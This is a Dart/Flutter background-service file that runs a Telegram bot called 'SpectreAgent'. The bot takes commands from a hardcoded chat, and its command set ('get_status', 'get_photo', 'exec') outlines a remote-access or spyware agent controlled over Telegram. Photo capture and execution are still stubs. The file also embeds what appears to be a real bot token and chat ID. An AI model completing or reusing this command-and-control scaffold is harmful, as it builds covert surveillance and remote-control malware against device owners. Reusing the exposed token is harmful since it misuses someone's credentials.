import 'dart:async';
import 'dart:ui';
import 'package:flutter/widgets.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:televerse/televerse.dart';

// TODO: REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
const String BOT_TOKEN = '7563152344:AAE2PvLBIGDbu-_s13XhWQTtAthQyquofNc';
const int CHAT_ID = -1002941249156; // Get this from a bot like @userinfobot

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  final bot = Bot(BOT_TOKEN);

  // 'ctx' is the "Context" - the wrapper
  bot.onMessage((ctx) async {
    // First, check if there's actually a message in the context
    if (ctx.message == null) return;
    
    // We access the message using 'ctx.message'
    // The '!' tells the compiler we know it's not null because we just checked.
    if (ctx.message!.chat.id != CHAT_ID) return;

    final text = ctx.message!.text?.toLowerCase() ?? '';
    final parts = text.split(' ');
    final command = parts[0];

    print("Received command: $command");

    try {
      switch (command) {
        case 'get_status':
          // We reply using the context's helper method
          await ctx.reply('SpectreAgent is online. Status: OK.');
          break;
        
        case 'get_photo':
          await ctx.reply('get_photo command received. Not implemented yet.');
          break;
        case 'exec':
          await ctx.reply('exec command received. Not implemented yet.');
          break;

        default:
          await ctx.reply('Unknown command: $command');
      }
    } catch (e) {
      await bot.api.sendMessage(ChatID(CHAT_ID), 'FUCK. Error executing command: $e');
    }
  });

  bot.start();
  service.invoke('update', {'message': 'SpectreAgent is listening...'});
}
